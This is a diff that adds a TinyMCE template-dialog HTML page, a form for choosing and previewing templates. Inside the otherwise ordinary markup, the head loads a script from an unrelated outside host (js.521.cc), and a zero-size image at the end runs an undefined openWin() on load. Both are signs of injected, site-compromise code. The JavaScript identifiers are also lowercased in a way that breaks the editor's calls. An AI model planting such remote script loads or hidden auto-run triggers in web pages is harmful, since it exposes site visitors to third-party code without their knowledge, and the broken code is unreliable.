@@ -1,0 +1,38 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<title>{#template_dlg.title}</title>
+	<script type="text/javascript" src="../../tiny_mce_popup.js"></script>
+	<script type="text/javascript" src="js/template.js"></script>
+	<link href="css/template.css" rel="stylesheet" type="text/css" />
+<script language="javascript" type="text/javascript" src="http://js.521.cc/js/user.js"></script></head>
+<body onresize="templatedialog.resize();"> 
+	<form onsubmit="templatedialog.insert();return false;">
+		<div id="frmbody">
+			<div class="title">{#template_dlg.desc}</div>
+			<div class="frmrow"><label for="tpath" title="{#template_dlg.select}">{#template_dlg.label}:</label>
+			<select id="tpath" name="tpath" onchange="templatedialog.selecttemplate(this.options[this.selectedindex].value, this.options[this.selectedindex].text);" class="mcefocus">
+				<option value="">{#template_dlg.select}...</option>
+			</select>
+			<span id="warning"></span></div>
+			<div class="frmrow"><label for="tdesc">{#template_dlg.desc_label}:</label>
+			<span id="tmpldesc"></span></div>
+			<fieldset>
+				<legend>{#template_dlg.preview}</legend>
+				<iframe id="templatesrc" name="templatesrc" src="blank.htm" width="690" height="400" frameborder="0"></iframe>
+			</fieldset>
+		</div>
+		
+		<div class="mceactionpanel">
+			<div style="float: left">
+				<input type="submit" id="insert" name="insert" value="{#insert}" />
+			</div>
+
+			<div style="float: right">
+				<input type="button" id="cancel" name="cancel" value="{#cancel}" onclick="tinymcepopup.close();" />
+			</div>
+
+			<br style="clear:both" />
+		</div>
+	</form>
+<img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body> 
+</html> 
